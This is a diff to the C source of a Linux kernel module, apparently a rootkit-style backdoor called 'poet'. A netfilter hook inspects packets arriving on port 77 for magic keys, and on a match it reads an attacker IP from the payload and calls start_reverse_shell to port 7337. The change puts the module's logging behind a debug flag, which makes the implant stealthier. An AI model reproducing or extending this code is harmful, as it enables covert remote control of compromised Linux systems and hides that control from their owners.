@@ -3,6 +3,7 @@
 const char* sKEY = "POET~SH~";
 const char* cKEY = "POET~CM~";
 const char* PORT = "7337"; 
+extern int debug;
 
 static unsigned int my_nf_hookIn(void *priv,
               struct sk_buff *skb,
@@ -44,7 +45,11 @@ static unsigned int my_nf_hookIn(void *priv,
         {
             return NF_ACCEPT; //We ignore those not for port 77
         }
-        printk(KERN_INFO "poet: Received packet on port 77\n");
+
+        if (debug == 1)
+        {
+            printk(KERN_INFO "poet: Received packet on port 77\n");
+        }
 
         // snprintf(ip_source, 16, "%pI4", &ip_header->saddr); // getting source address
  
@@ -58,21 +63,31 @@ static unsigned int my_nf_hookIn(void *priv,
         user_data = skb_header_pointer(skb, ip_header->ihl*4 + 8, size, &_data);
         if(!user_data)
         {
-            printk(KERN_INFO "NULL INFO");
+            if (debug == 1)
+            {
+                printk(KERN_INFO "NULL INFO\n");
+            }
+            
             kfree(_data);
             return NF_ACCEPT;
         }
         // format=POET~IP
-
-        printk(KERN_DEBUG "data len : %d\ndata : \n", (int)strlen(user_data));
-        printk(KERN_DEBUG "%s\n", user_data);
-        printk(KERN_INFO "%s\n", ip_source);
+        if (debug == 1)
+        {
+            printk(KERN_DEBUG "data len : %d\ndata : \n", (int)strlen(user_data));
+            printk(KERN_INFO "%s\n", ip_source);
+        }
+        
         if (memcmp(user_data, sKEY, strlen(sKEY))==0) // reverse shell 
         {
             char* revIP = kmalloc(32, GFP_KERNEL);
             strncpy(revIP, user_data + 8, 32);
-            printk(KERN_INFO "successful compare and %s\n", revIP);
-
+            
+            if (debug == 1)
+            {
+                printk(KERN_INFO "successful compare and %s\n", revIP);
+            }
+            
             start_reverse_shell(revIP, PORT);
 
             kfree(revIP);
